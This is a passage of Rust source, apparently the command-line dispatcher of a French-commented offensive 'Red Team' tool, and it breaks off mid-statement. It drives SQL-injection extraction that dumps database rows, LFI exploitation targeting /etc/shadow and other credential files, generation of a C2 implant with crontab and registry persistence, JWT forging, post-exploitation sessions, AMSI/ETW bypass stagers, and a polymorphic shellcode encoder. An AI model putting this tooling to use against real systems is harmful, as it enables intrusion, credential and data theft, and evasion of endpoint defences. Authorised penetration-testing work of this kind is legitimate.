        if let Err(e) = crate::oob::OobListener::start(bind, &host).await {
            eprintln!(
                "  \x1b[33m[WARN]\x1b[0m écouteur OOB indisponible sur {} : {}",
                bind, e
            );
        }
    }

    // ── --oob-dns-bind : répondeur DNS OOB (canal de confirmation alternatif) ──
    if let Some(ref bind) = cli.oob_dns_bind {
        let answer = crate::oob::answer_ip_for_bind(bind);
        let domain = cli.oob_dns_domain.clone().unwrap_or_default();
        if let Err(e) = crate::oob::OobListener::start_dns(bind, &answer, &domain).await {
            eprintln!(
                "  \x1b[33m[WARN]\x1b[0m répondeur DNS OOB indisponible sur {} : {}",
                bind, e
            );
        }
    }

    if cli.list_ifaces {
        let ifaces = list_interfaces();
        println!("📡 Available network interfaces:");
        if ifaces.is_empty() {
            println!("   (none detected — permissions may be needed)");
        } else {
            for (i, name) in ifaces.iter().enumerate() {
                println!("   {}. {}", i + 1, name);
            }
        }
        println!(
            "\n💡 Tip: cargo run -- --capture-iface {} --capture-duration 60",
            ifaces.first().map(|s| s.as_str()).unwrap_or("<iface>")
        );
        return Ok(());
    }

    // ── --update-cve-db : télécharger les CVEs depuis NVD API v2 ─────────────
    if cli.update_cve_db {
        let path = resolve_config_path(&cli.cve_db);
        match nvd::update_cve_db_from_nvd(&path).await {
            Ok(n) => {
                println!("✅ CVE DB mise à jour : {} nouvelles entrées", n);
            }
            Err(e) => {
                eprintln!("❌ Erreur mise à jour CVE DB : {}", e);
                std::process::exit(1);
            }
        }
        return Ok(());
    }

    // ── --doctor : vérification de l'environnement ───────────────────────────
    if cli.doctor {
        run_doctor(&cli);
        return Ok(());
    }

    // ── --ai-agent : lancer l'agent IA autonome Red Team ─────────────────────
    if cli.ai_agent {
        return run_ai_agent(&cli).await;
    }

    // ── --scan-local : détecter la gateway et lancer un scan ciblé ───────────
    if cli.scan_local {
        return run_scan_local(&cli).await;
    }

    // ── --netscan : moteur de scan réseau inspiré de nmap ─────────────────────
    if let Some(ref target) = cli.netscan.clone() {
        return run_netscan(&cli, target).await;
    }

    // ── --sqli-extract : extraction SQLi standalone sur URL fournie ───────────
    if let Some(ref raw) = cli.sqli_extract.clone() {
        if cli.web_spider.is_none() && cli.web_scan.is_none() {
            use crate::web_attack::normalize_web_target;
            use crate::web_spider::sqli_extract as do_sqli_extract;
            use ansi::*;
            let fire2 = "\x1b[38;5;196m";
            let cfg = web_attack_config(&cli);
            let url = normalize_web_target(raw, &cfg).await;
            println!(
                "\n  {BOLD}{fire2}▍ SQLi DATA EXTRACTION STANDALONE{RESET}  {}",
                url
            );
            println!("  {GRIS}{}{RESET}", "▔".repeat(64));
            println!("  {DIM}(mode auto: paramètres ?id / ?page / ?article / ?q testés en UNION + ERROR + BLIND){RESET}");
            let params = [
                "id", "page", "article", "q", "user", "post", "cat", "item", "prod", "ref",
            ];
            let mut any_found = false;
            for p in &params {
                for tech in &["union", "error", "blind"] {
                    // Le repli aveugle passe par l'énumérateur booléen de
                    // `web_attack` : contrairement à `web_spider::sqli_extract`
                    // (qui ne remonte que la version en mode blind), il énumère
                    // bases / tables / colonnes / lignes — utile quand UNION est filtré.
                    if *tech == "blind" {
                        if let Some(ext) = crate::web_attack::extract_sqli_data(&url, p, &cfg).await
                        {
                            if ext.current_db.is_some()
                                || !ext.databases.is_empty()
                                || !ext.tables.is_empty()
                                || !ext.rows.is_empty()
                            {
                                any_found = true;
                                println!("  \x1b[32m[OK]\x1b[0m param='{}' technique=blind (énumération booléenne)", p);
                                if let Some(db) = &ext.current_db {
                                    println!("  {fire2}[DB]{RESET} {}", db);
                                }
                                for d in &ext.databases {
                                    println!("  {fire2}[BASE]{RESET} {}", d);
                                }
                                for t in &ext.tables {
                                    println!("  {fire2}[TABLE]{RESET} {}", t);
                                }
                                for c in &ext.columns {
                                    println!("  {fire2}[COLONNE]{RESET} {}", c);
                                }
                                for r in &ext.rows {
                                    println!(
                                        "  {fire2}[DATA]{RESET} {}",
                                        r.chars().take(200).collect::<String>()
                                    );
                                }
                                break;
                            }
                        }
                        continue;
                    }

                    let extraction =
                        do_sqli_extract(&url, p, "GET", tech, &cfg.auth, &cfg.proxies).await;
                    if extraction.db_version.is_some()
                        || !extraction.databases.is_empty()
                        || !extraction.sample_data.is_empty()
                    {
                        any_found = true;
                        println!("  \x1b[32m[OK]\x1b[0m param='{}' technique={}", p, tech);
                        if let Some(ref ver) = extraction.db_version {
                            println!(
                                "  {fire2}[DB]{RESET} type={} ver={}",
                                extraction.db_type.as_deref().unwrap_or("?"),
                                ver
                            );
                        }
                        for db in &extraction.databases {
                            println!("  {fire2}[BASE]{RESET} {}", db);
                        }
                        for table in &extraction.tables {
                            println!("  {fire2}[TABLE]{RESET} {}", table);
                        }
                        for row in &extraction.sample_data {
                            let table = row.first().map(|s| s.as_str()).unwrap_or("?");
                            let data = row.get(1).map(|s| s.as_str()).unwrap_or("");
                            println!(
                                "  {fire2}[DATA]{RESET} {}: {}",
                                table,
                                data.chars().take(200).collect::<String>()
                            );
                        }
                        break;
                    }
                }
                if any_found {
                    break;
                }
            }
            if !any_found {
                println!("  {GRIS}Aucune extraction SQLi possible sur les paramètres standard (ajoutez ?id=1 à l'URL pour cibler).{RESET}");
            }
            return Ok(());
        }
    }

    // ── --web-spider : crawl + injection sur une URL cible ────────────────────
    if let Some(ref raw) = cli.web_spider.clone() {
        use crate::web_attack::normalize_web_target;
        use crate::web_spider::{full_web_scan_with_spider, WebScanConfig};
        use ansi::*;
        let fire2 = "\x1b[38;5;196m";
        let wa = web_attack_config(&cli);
        let url = normalize_web_target(raw, &wa).await;
        // Extensions statiques supplémentaires exclues du crawl (`--spider-ext`).
        let extra_static_ext = match cli.spider_ext.as_deref() {
            Some(f) => match crate::web_spider::load_static_ext_file(f) {
                Ok(v) => {
                    println!(
                        "  ▸ extensions de crawl exclues : {} entrées ({})",
                        v.len(),
                        f
                    );
                    v
                }
                Err(e) => {
                    eprintln!("  ⚠️  --spider-ext : {}", e);
                    Vec::new()
                }
            },
            None => Vec::new(),
        };
        let cfg = WebScanConfig {
            max_pages: cli.spider_pages,
            max_depth: cli.spider_depth,
            extract_data: cli.sqli_extract.is_some() || cli.web_exploit,
            ssrf_callback: wa.ssrf_callback.clone(),
            auth: wa.auth.clone(),
            concurrency: wa.concurrency,
            stealth_level: wa.stealth_level.clone(),
            waf_bypass: wa.waf_bypass,
            retries: wa.retries,
            proxies: wa.proxies.clone(),
            extra_static_ext,
            ..Default::default()
        };
        println!("\n  {BOLD}{fire2}▍ WEB SPIDER + INJECTIONS{RESET}  {}", url);
        println!("  {GRIS}{}{RESET}", "▔".repeat(64));
        println!(
            "  📄 Pages max : {}   Profondeur : {}   SQLi-extract : {}",
            cfg.max_pages,
            cfg.max_depth,
            if cfg.extract_data { "ON" } else { "OFF" }
        );
        let (crawled, vulns, extractions) = full_web_scan_with_spider(&url, &cfg).await;
        println!("  🕸️ Crawl terminé : {} pages uniques", crawled.pages.len());
        if !vulns.is_empty() {
            println!("\n  {BOLD}{fire2}▍ {} VULN(S) WEB{RESET}", vulns.len());
            for v in &vulns {
                println!(
                    "  [{sev}] {typ} — {param}",
                    sev = v.severity,
                    typ = v.vuln_type,
                    param = v.parameter
                );
            }
            if let Ok(j) = serde_json::to_string_pretty(&vulns) {
                let out = cli.output.replace(".json", ".web.json");
                let _ = std::fs::write(&out, j);
                println!("  💾 Web report: {}", out);
            }
        } else {
            println!("  ✅ Aucune vulnérabilité web détectée");
        }
        for ext in &extractions {
            if let Some(ref ver) = ext.db_version {
                println!(
                    "  {fire2}[DB]{RESET} type={} ver={}",
                    ext.db_type.as_deref().unwrap_or("?"),
                    ver
                );
            }
            for row in &ext.sample_data {
                let table = row.first().map(|s| s.as_str()).unwrap_or("?");
                let data = row.get(1).map(|s| s.as_str()).unwrap_or("");
                println!(
                    "  {fire2}[DATA]{RESET} {}: {}",
                    table,
                    data.chars().take(100).collect::<String>()
                );
            }
        }
        return Ok(());
    }

    // ── --web-scan : scanner les injections web ───────────────────────────────
    if let Some(ref raw_url) = cli.web_scan.clone() {
        use crate::web_attack::{exploit_lfi, full_web_scan};
        use crate::web_spider::sqli_extract as do_sqli_extract;
        use ansi::*;
        let fire2 = "\x1b[38;5;196m";
        let fire3 = "\x1b[38;5;214m";
        let mut url = raw_url.clone();
        if cli.spider_ext.is_some() {
            eprintln!("  ⚠️  --spider-ext ignoré : s'applique au crawl de --web-spider (le crawl interne de --web-scan garde la liste d'extensions par défaut).");
        }
        if !url.starts_with("http://") && !url.starts_with("https://") {
            url = format!("https://{}", url);
        }
        {
            let cfg = crate::web_attack::WebAttackConfig {
                test_sqli: true,
                // Extraction post-exploitation (opt-in) : SQLi aveugle + LFI + CMDi
                // déclenchée uniquement si l'opérateur demande explicitement à
                // exploiter (--web-exploit) ou à extraire (--sqli-extract).
                extract_data: cli.sqli_extract.is_some() || cli.web_exploit,
                ..web_attack_config(&cli)
            };
            let report = full_web_scan(&url, &cfg).await;
            if crate::oob::OobListener::hit_count() > 0 {
                println!(
                    "  \x1b[35m[OOB]\x1b[0m {} callback(s) confirmé(s) par l'écouteur",
                    crate::oob::OobListener::hit_count()
                );
            }
            if !report.vulns.is_empty() {
                println!(
                    "\n  {BOLD}{fire2}▍ {} VULN(S) WEB{RESET}",
                    report.vulns.len()
                );
                for v in &report.vulns {
                    println!(
                        "  [{sev}] {typ} — {param}",
                        sev = v.severity,
                        typ = v.vuln_type,
                        param = v.parameter
                    );
                }
                if let Ok(j) = serde_json::to_string_pretty(&report) {
                    let out = cli.output.replace(".json", ".web.json");
                    let _ = std::fs::write(&out, j);
                    println!("  💾 Web report: {}", out);
                }

                // ── EXPLOITATION SQLi ──────────────────────────────────
                let do_sqli = cli.sqli_extract.is_some() || cli.web_exploit;
                if do_sqli {
                    let sqli_vulns: Vec<_> = report
                        .vulns
                        .iter()
                        .filter(|v| v.vuln_type.contains("SQL") || v.vuln_type.contains("sql"))
                        .collect();
                    if !sqli_vulns.is_empty() {
                        rule("EXPLOITATION SQLi", fire2);
                        println!("  {DIM}Mode: UNION + ERROR + BLIND · auto-détection technique par vuln{RESET}");
                        for v in &sqli_vulns {
                            let technique = if v.vuln_type.contains("Union") {
                                "union"
                            } else if v.vuln_type.contains("Blind")
                                || v.vuln_type.contains("Boolean")
                            {
                                "blind"
                            } else if v.vuln_type.contains("Time") {
                                "blind"
                            } else {
                                "error"
                            };
                            println!(
                                "\n  {fire3}→ param='{}' technique={}{RESET}",
                                v.parameter, technique
                            );
                            let extraction = do_sqli_extract(
                                &url,
                                &v.parameter,
                                "GET",
                                technique,
                                &cfg.auth,
                                &cfg.proxies,
                            )
                            .await;
                            if extraction.db_version.is_none()
                                && extraction.databases.is_empty()
                                && extraction.sample_data.is_empty()
                            {
                                // fallback: tenter toutes les techniques
                                for fallback in &["union", "error", "blind"] {
                                    if fallback == &technique {
                                        continue;
                                    }
                                    println!("  {DIM}  retry technique={}{RESET}", fallback);
                                    let fb = do_sqli_extract(
                                        &url,
                                        &v.parameter,
                                        "GET",
                                        fallback,
                                        &cfg.auth,
                                        &cfg.proxies,
                                    )
                                    .await;
                                    if fb.db_version.is_some()
                                        || !fb.databases.is_empty()
                                        || !fb.sample_data.is_empty()
                                    {
                                        println!(
                                            "  \x1b[32m[OK]\x1b[0m réussi en technique={}",
                                            fallback
                                        );
                                        if let Some(ref ver) = fb.db_version {
                                            println!(
                                                "  {fire2}[DB]{RESET} type={} ver={}",
                                                fb.db_type.as_deref().unwrap_or("?"),
                                                ver.chars().take(80).collect::<String>()
                                            );
                                        }
                                        for db in &fb.databases {
                                            println!("  {fire2}[BASE]{RESET} {}", db);
                                        }
                                        for row in &fb.sample_data {
                                            let table =
                                                row.first().map(|s| s.as_str()).unwrap_or("?");
                                            let data = row.get(1).map(|s| s.as_str()).unwrap_or("");
                                            println!(
                                                "  {fire2}[DATA]{RESET} {}: {}",
                                                table,
                                                data.chars().take(200).collect::<String>()
                                            );
                                        }
                                        break;
                                    }
                                }
                            } else {
                                if let Some(ref ver) = extraction.db_version {
                                    println!("  \x1b[32m[OK]\x1b[0m extraction réussie");
                                    println!(
                                        "  {fire2}[DB]{RESET} type={} ver={}",
                                        extraction.db_type.as_deref().unwrap_or("?"),
                                        ver.chars().take(80).collect::<String>()
                                    );
                                }
                                if let Some(ref u) = extraction.db_user {
                                    println!("  {fire2}[USER]{RESET} {}", u);
                                }
                                for db in &extraction.databases {
                                    println!("  {fire2}[BASE]{RESET} {}", db);
                                }
                                for row in &extraction.sample_data {
                                    let table = row.first().map(|s| s.as_str()).unwrap_or("?");
                                    let data = row.get(1).map(|s| s.as_str()).unwrap_or("");
                                    println!(
                                        "  {fire2}[DATA]{RESET} {}: {}",
                                        table,
                                        data.chars().take(200).collect::<String>()
                                    );
                                }
                            }
                        }
                    }
                } else if report.vulns.iter().any(|v| v.vuln_type.contains("SQL")) {
                    println!("\n  {DIM}💡 SQLi détectée — ajoutez --web-exploit ou --sqli-extact <URL> pour extraire données{RESET}");
                }

                // ── EXPLOITATION LFI ───────────────────────────────────
                if cli.web_exploit {
                    let lfi_vulns: Vec<_> = report
                        .vulns
                        .iter()
                        .filter(|v| {
                            v.vuln_type.contains("LFI")
                                || v.vuln_type.contains("Path Traversal")
                                || v.vuln_type.contains("File Inclusion")
                        })
                        .map(|v| v.parameter.as_str())
                        .collect::<std::collections::HashSet<_>>()
                        .into_iter()
                        .collect::<Vec<_>>();
                    if !lfi_vulns.is_empty() {
                        rule("EXPLOITATION LFI / Path Traversal", fire2);
                        println!("  {DIM}Wrappers testés: php://filter · file:// · data:// · expect:// · php://input POST{RESET}");
                        println!("  {DIM}Fichiers ciblés: /etc/passwd · /etc/shadow · /proc/self/environ · win.ini · logs{RESET}");
                        let _exploitations = exploit_lfi(&url, &lfi_vulns, &cfg).await;
                    }
                } else if report
                    .vulns
                    .iter()
                    .any(|v| v.vuln_type.contains("LFI") || v.vuln_type.contains("Path Traversal"))
                {
                    println!("  {DIM}💡 LFI/Traversal détecté — ajoutez --web-exploit pour tenter lecture fichiers / RCE{RESET}");
                }
            } else {
                println!("  ✅ Aucune vulnérabilité web détectée sur {}", url);
            }
        }
        return Ok(());
    }

    // ── --gen-implant : générer un implant C2 ────────────────────────────────
    if let Some(ref c2_url) = cli.gen_implant.clone() {
        use crate::c2::agent::{
            generate_powershell_implant, generate_python_implant, resolve_decoy_urls, ImplantConfig,
        };
        use ansi::*;
        let fire2 = "\x1b[38;5;196m";
        let decoys = resolve_decoy_urls();
        let implant_cfg = ImplantConfig {
            c2_url: c2_url.clone(),
            c2_ws_url: c2_url
                .replace("http://", "ws://")
                .replace("https://", "wss://"),
            sleep_secs: 60,
            jitter: 0.3,
            persist: cli.implant_persist,
            kill_date: cli.implant_kill_date.clone(),
            decoys,
        };
        println!("\n  {BOLD}{fire2}▍ IMPLANT GENERATOR{RESET}  C2={}", c2_url);
        let py = generate_python_implant(&implant_cfg);
        let _ = std::fs::write("diapile_agent.py", &py);
        println!(
            "  🐍 Python implant    : diapile_agent.py ({} bytes)",
            py.len()
        );
        let ps = generate_powershell_implant(&implant_cfg);
        let _ = std::fs::write("diapile_agent.ps1", format!("# Encoded\n{}", ps));
        println!("  💻 PowerShell implant: diapile_agent.ps1 (encoded)");
        if cli.implant_persist {
            println!("  🔗 Persistance activée : crontab + registry");
        }
        return Ok(());
    }

    // ── --osint : reconnaissance passive v2 (Shodan + Censys + Wayback) ──────
    if let Some(ref raw_domain) = cli.osint.clone() {
        use crate::live_dashboard::LiveHub;
        use crate::osint::{
            full_osint_recon_v2, normalize_domain, print_osint_report, OsintApiKeys,
        };

        // Live Dashboard WS (OPSEC bind 127.0.0.1 SEULEMENT) — fournit le graphe
        // OSINT en temps réel. Démarré automatiquement si --dashboard-live OU
        // si aucune option contraire (pour OSINT c'est la valeur par défaut).
        let mut ws_task: Option<tokio::task::JoinHandle<()>> = None;
        let mut emit: Option<crate::live_dashboard::DashboardEmitter> = None;

        if cli.dashboard_live {
            use crate::live_dashboard::open_browser;
            match LiveHub::bind(cli.dashboard_port).await {
                Ok(hub) => {
                    let port = hub.bind_port();
                    let url = format!("http://127.0.0.1:{}/", port);
                    emit = Some(hub.emitter());
                    let handle = tokio::spawn(async move { hub.serve().await });
                    ws_task = Some(handle);
                    println!("  \x1b[38;5;196m▍ LIVE DASHBOARD OSINT GRAPH\x1b[0m {} · ws://127.0.0.1:{}/ws", url, port);
                    if !cli.no_dashboard_auto_open {
                        match open_browser(&url) {
                            Ok(()) => println!(
                                "  \x1b[32m✓\x1b[0m  Navigateur ouvert automatiquement sur {}",
                                url
                            ),
                            Err(_) => println!(
                                "  \x1b[33mℹ\x1b[0m  Ouvrir manuellement : {}  (ou dashboard.html)",
                                url
                            ),
                        }
                    } else {
                        println!(
                            "  \x1b[90mℹ\x1b[0m  --no-dashboard-auto-open : ouvrir manuellement {}",
                            url
                        );
                    }
                    println!(
                        "  \x1b[90mCtrl-C pour fermer le serveur (la console reste bloquée)\x1b[0m"
                    );
                }
                Err(e) => {
                    println!(
                        "  \x1b[33m⚠ Dashboard LIVE indisponible (port {}): {}\x1b[0m",
                        cli.dashboard_port, e
                    );
                }
            }
        }

        let domain = normalize_domain(raw_domain);
        let keys = OsintApiKeys {
            shodan: cli
                .shodan_key
                .clone()
                .or_else(|| std::env::var("SHODAN_API_KEY").ok()),
            censys_id: std::env::var("CENSYS_API_ID").ok(),
            censys_secret: std::env::var("CENSYS_API_SECRET").ok(),
            hibp: cli
                .hibp_key
                .clone()
                .or_else(|| std::env::var("HIBP_API_KEY").ok()),
            github: cli
                .github_key
                .clone()
                .or_else(|| std::env::var("GITHUB_TOKEN").ok()),
        };
        let (_, _, _, _, _, _, _, runtime) = load_config_effective(&cli);
        let llm_client = if let Some(cfg) = &runtime.llm {
            build_client(cfg).ok()
        } else {
            None
        };

        let report = full_osint_recon_v2(
            &domain,
            &keys,
            emit.as_ref(),
            llm_client.as_ref().map(|c| c.as_ref()),
        )
        .await;
        print_osint_report(&report);
        let out_path = cli.output.replace(".json", ".osint.json");
        if let Ok(j) = serde_json::to_string_pretty(&report) {
            let _ = std::fs::write(&out_path, j);
            println!("  💾 OSINT JSON : {}", out_path);
        }

        // Garder le serveur WS ouvert 2 secondes supplémentaires pour laisser le
        // navigateur récupérer le snapshot final, puis drop proprement.
        if ws_task.is_some() {
            use std::time::Duration;
            println!("\n  \x1b[32m✓ OSINT terminé.\x1b[0m Serveur WS maintenu 60s pour visualisation (Ctrl-C pour quitter)");
            let _ = tokio::time::timeout(Duration::from_secs(60), async {
                loop {
                    tokio::time::sleep(Duration::from_secs(3600)).await;
                }
            })
            .await;
            if let Some(h) = ws_task {
                h.abort();
                let _ = h.await;
            }
        }

        return Ok(());
    }

    // ── --jwt-analyze : analyser un token JWT ────────────────────────────────
    if let Some(ref token) = cli.jwt_analyze {
        use crate::web_attack::analyze_jwt;
        use ansi::*;
        match analyze_jwt(token) {
            Some(analysis) => {
                println!(
                    "\n  {BOLD}[JWT]{RESET}  alg={CYAN}{}{RESET}",
                    analysis.algorithm
                );
                println!(
                    "  payload: {}",
                    serde_json::to_string_pretty(&analysis.payload)
                        .unwrap_or_default()
                        .chars()
                        .take(300)
                        .collect::<String>()
                );
                if !analysis.vulns.is_empty() {
                    println!("\n  {BOLD}\x1b[38;5;196m▍ JWT VULNÉRABILITÉS\x1b[0m{RESET}");
                    for v in &analysis.vulns {
                        println!("  ⚠️  {}", v);
                    }
                }
                if !analysis.forged_tokens.is_empty() {
                    println!("\n  {BOLD}\x1b[38;5;196m▍ TOKENS FORGÉS\x1b[0m{RESET}");
                    for (tech, tok) in &analysis.forged_tokens {
                        println!("  [{}] {}", tech, &tok[..tok.len().min(120)]);
                    }
                }
            }
            None => println!("  [JWT] Token invalide ou format non reconnu"),
        }
        return Ok(());
    }

    // ── --iot-scan : scanner IoT/SCADA ───────────────────────────────────────
    if cli.iot_scan {
        use crate::iot_scada::full_iot_scan;
        let hosts: Vec<&str> = cli
            .targets
            .as_ref()
            .map(|t| {
                t.iter()
                    .map(|s| {
                        if let Some(h) = s.split(':').next() {
                            h
                        } else {
                            s.as_str()
                        }
                    })
                    .collect()
            })
            .unwrap_or_default();
        if hosts.is_empty() {
            println!("  [IoT] Spécifiez des cibles avec -t 192.168.1.1,192.168.1.2");
            return Ok(());
        }
        let report = full_iot_scan(&hosts).await;
        if let Ok(j) = serde_json::to_string_pretty(&report) {
            let out = cli.output.replace(".json", ".iot.json");
            let _ = std::fs::write(&out, j);
            println!("  💾 IoT report: {}", out);
        }
        return Ok(());
    }

    // ── --iptv-scan : reconnaissance IPTV/DLNA ───────────────────────────────
    if cli.iptv_scan {
        use crate::iptv::full_iptv_scan;
        let hosts: Vec<&str> = cli
            .targets
            .as_ref()
            .map(|t| {
                t.iter()
                    .map(|s| {
                        if let Some(h) = s.split(':').next() {
                            h
                        } else {
                            s.as_str()
                        }
                    })
                    .collect()
            })
            .unwrap_or_default();
        if hosts.is_empty() {
            println!("  [IPTV] Spécifiez des cibles avec -t 192.168.1.10,192.168.1.11");
            return Ok(());
        }
        let report = full_iptv_scan(&hosts).await;
        if let Ok(j) = serde_json::to_string_pretty(&report) {
            let out = cli.output.replace(".json", ".iptv.json");
            let _ = std::fs::write(&out, j);
            println!("  💾 IPTV report: {}", out);
        }
        return Ok(());
    }

    // ════════════════════════════════════════════════════════════════════════
    // NOUVEAUX MODULES — Web Avancé : SSTI, CORS, HTTP Smuggling, GraphQL, OAuth2
    // ════════════════════════════════════════════════════════════════════════
    if let Some(ref url) = cli.ssti_scan.clone() {
        use crate::web_attack::{scan_ssti, WebAttackConfig};
        println!("\n  \x1b[38;5;196m▍ SSTI SCAN\x1b[0m  {}", url);
        let cfg = WebAttackConfig::default();
        let params_owned: Vec<String> = extract_query_params(url);
        let params: Vec<&str> = params_owned
            .iter()
            .map(|s| s.as_str())
            .chain(
                [
                    "name", "search", "q", "template", "page", "id", "input", "data",
                ]
                .iter()
                .copied(),
            )
            .collect();
        let vulns = scan_ssti(url, &params, &cfg).await;
        if vulns.is_empty() {
            println!("  \x1b[90mAucune vulnérabilité SSTI détectée\x1b[0m");
        } else {
            for v in &vulns {
                println!(
                    "  \x1b[38;5;196m[SSTI]\x1b[0m {} param={} engine={}",
                    v.url, v.parameter, v.vuln_type
                );
                println!("  \x1b[90m  → {}\x1b[0m", v.remediation);
            }
        }
        return Ok(());
    }

    if let Some(ref url) = cli.cors_scan.clone() {
        use crate::web_attack::{scan_cors, WebAttackConfig};
        println!("\n  \x1b[38;5;196m▍ CORS SCAN\x1b[0m  {}", url);
        let cfg = WebAttackConfig::default();
        let vulns = scan_cors(url, &cfg).await;
        if vulns.is_empty() {
            println!("  \x1b[90mAucune misconfiguration CORS détectée\x1b[0m");
        } else {
            for v in &vulns {
                println!("  \x1b[38;5;196m[{}]\x1b[0m {}", v.severity, v.vuln_type);
                println!("  \x1b[90m  Evidence: {}\x1b[0m", v.evidence);
                println!("  \x1b[90m  Fix: {}\x1b[0m", v.remediation);
            }
        }
        return Ok(());
    }

    if let Some(ref url) = cli.smuggling_scan.clone() {
        use crate::web_attack::{scan_http_smuggling, WebAttackConfig};
        println!("\n  \x1b[38;5;196m▍ HTTP SMUGGLING SCAN\x1b[0m  {}", url);
        let cfg = WebAttackConfig::default();
        let vulns = scan_http_smuggling(url, &cfg).await;
        if vulns.is_empty() {
            println!("  \x1b[90mAucun HTTP Smuggling détecté\x1b[0m");
        } else {
            for v in &vulns {
                println!(
                    "  \x1b[38;5;196m[{}]\x1b[0m {} conf={:.0}%",
                    v.severity,
                    v.vuln_type,
                    v.confidence * 100.0
                );
                println!("  \x1b[90m  {}\x1b[0m", v.evidence);
            }
        }
        return Ok(());
    }

    if let Some(ref raw_url) = cli.graphql_scan.clone() {
        use crate::web_attack::{scan_graphql, WebAttackConfig};
        let mut url = raw_url.clone();
        if !url.starts_with("http://") && !url.starts_with("https://") {
            url = format!("https://{}", url);
        }
        println!("\n  \x1b[38;5;196m▍ GRAPHQL SCAN\x1b[0m  {}", url);
        let cfg = WebAttackConfig::default();
        let vulns = scan_graphql(&url, &cfg).await;
        if vulns.is_empty() {
            println!("  \x1b[90mAucun endpoint GraphQL vulnérable trouvé\x1b[0m");
        } else {
            for v in &vulns {
                println!(
                    "  \x1b[38;5;196m[GraphQL {}]\x1b[0m {}",
                    v.severity, v.vuln_type
                );
                println!("  \x1b[90m  {}\x1b[0m", v.evidence);
            }
        }
        return Ok(());
    }

    if let Some(ref url) = cli.oauth2_scan.clone() {
        use crate::web_attack::{scan_oauth2, WebAttackConfig};
        println!("\n  \x1b[38;5;196m▍ OAUTH2 SCAN\x1b[0m  {}", url);
        let cfg = WebAttackConfig::default();
        let vulns = scan_oauth2(url, &cfg).await;
        if vulns.is_empty() {
            println!("  \x1b[90mAucune misconfiguration OAuth2 détectée\x1b[0m");
        } else {
            for v in &vulns {
                println!(
                    "  \x1b[38;5;196m[OAuth2 {}]\x1b[0m {}",
                    v.severity, v.vuln_type
                );
                println!("  \x1b[90m  {}\x1b[0m", v.remediation);
            }
        }
        return Ok(());
    }

    // ════════════════════════════════════════════════════════════════════════
    // NOUVEAUX MODULES — Protocoles Réseau Avancés : SNMP, IPMI, K8s, RPC
    // ════════════════════════════════════════════════════════════════════════
    if let Some(ref host) = cli.snmp_scan.clone() {
        use crate::network_advanced::{print_advanced_results, scan_snmp};
        println!("\n  \x1b[38;5;196m▍ SNMP SCAN\x1b[0m  {}", host);
        let result = scan_snmp(host, 161).await;
        print_advanced_results(&[result]);
        return Ok(());
    }

    if let Some(ref host) = cli.ipmi_scan.clone() {
        use crate::network_advanced::{print_advanced_results, scan_ipmi};
        println!("\n  \x1b[38;5;196m▍ IPMI SCAN\x1b[0m  {} (UDP/623)", host);
        let result = scan_ipmi(host, 623).await;
        print_advanced_results(&[result]);
        return Ok(());
    }

    if let Some(ref host) = cli.k8s_scan.clone() {
        use crate::network_advanced::{print_advanced_results, scan_kubernetes};
        println!("\n  \x1b[38;5;196m▍ KUBERNETES SCAN\x1b[0m  {}", host);
        let result = scan_kubernetes(host).await;
        print_advanced_results(&[result]);
        return Ok(());
    }

    if let Some(ref host) = cli.rpc_scan.clone() {
        use crate::network_advanced::{print_advanced_results, scan_msrpc};
        println!("\n  \x1b[38;5;196m▍ MS-RPC SCAN\x1b[0m  {}:135", host);
        let result = scan_msrpc(host).await;
        print_advanced_results(&[result]);
        return Ok(());
    }

    if let Some(ref host) = cli.advanced_scan.clone() {
        use crate::network_advanced::{print_advanced_results, scan_all_advanced};
        println!(
            "\n  \x1b[38;5;196m▍ ADVANCED SCAN\x1b[0m  {} (SNMP+IPMI+K8s+MS-RPC en parallèle)",
            host
        );
        let results = scan_all_advanced(host).await;
        print_advanced_results(&results);
        // Exporter en JSON
        let out_path = cli.output.replace(".json", ".advanced.json");
        if let Ok(j) = serde_json::to_string_pretty(&results) {
            let _ = std::fs::write(&out_path, &j);
            println!("  💾 Résultats: {}", out_path);
        }
        return Ok(());
    }

    // ════════════════════════════════════════════════════════════════════════
    // NOUVEAUX MODULES — Post-exploit, Évasion EDR, ATT&CK, Reporting
    // ════════════════════════════════════════════════════════════════════════
    if let Some(session_id) = cli.post_exploit {
        use crate::agents::{PostExploitAgent, PostExploitAgentConfig};
        use crate::shell::GLOBAL_SESSIONS;
        println!(
            "\n  \x1b[38;5;196m▍ POST-EXPLOIT AUTO\x1b[0m  session={}",
            session_id
        );
        let mut agent = PostExploitAgent::new(
            PostExploitAgentConfig {
                lhost: cli.lhost.clone(),
                lport: cli.lport,
                ..Default::default()
            },
            GLOBAL_SESSIONS.clone(),
        );
        let report = agent.run_on_session(session_id).await;
        agent.print_summary();
        let out = cli.output.replace(".json", ".post_exploit.json");
        if let Ok(j) = serde_json::to_string_pretty(&report) {
            let _ = std::fs::write(&out, j);
            println!("  💾 Rapport post-exploit: {}", out);
        }
        return Ok(());
    }

    if cli.gen_evasion {
        use crate::evasion::{
            generate_amsi_bypass_ps1, generate_etw_patch_ps1, generate_hook_scanner_ps1,
            AmsiBypassVariant,
        };
        println!("\n  \x1b[38;5;196m▍ GÉNÉRATION STAGERS EDR BYPASS\x1b[0m");
        let variant = match cli.amsi_variant.as_str() {
            "PatchAmsiScanBuffer" => AmsiBypassVariant::PatchAmsiScanBuffer,
            "SetContextError" => AmsiBypassVariant::SetContextError,
            _ => AmsiBypassVariant::ForcedError,
        };
        // AMSI bypass
        let amsi = generate_amsi_bypass_ps1(variant);
        let amsi_path = "amsi_bypass.ps1";
        std::fs::write(amsi_path, &amsi)?;
        println!("  \x1b[32m[+]\x1b[0m AMSI bypass PS1  → {}", amsi_path);
        // ETW patch
        let etw = generate_etw_patch_ps1();
        let etw_path = "etw_patch.ps1";
        std::fs::write(etw_path, &etw)?;
        println!("  \x1b[32m[+]\x1b[0m ETW patch PS1     → {}", etw_path);
        // Hook scanner
        let scanner = generate_hook_scanner_ps1();
        let scanner_path = "hook_scanner.ps1";
        std::fs::write(scanner_path, &scanner)?;
        println!("  \x1b[32m[+]\x1b[0m EDR hook scanner  → {}", scanner_path);
        println!("\n  \x1b[90mUsage: powershell -ep bypass -file amsi_bypass.ps1\x1b[0m");
        return Ok(());
    }

    if let Some(ref hex) = cli.encode_shellcode.clone() {
        use crate::evasion::polymorphic_encode;
        println!("\n  \x1b[38;5;196m▍ SHELLCODE ENCODER POLYMORPHIQUE\x1b[0m");
        let raw = hex::decode(hex.trim()).map_err(|e| anyhow!("Shellcode hex invalide: {}", e))?;
        let payload = polymorphic_encode(&raw, cli.encode_seed);
        println!(
            "  \x1b[32m[+]\x1b[0m {} bytes encodés (seed=0x{:02X}, {} couches)",
            raw.len(),
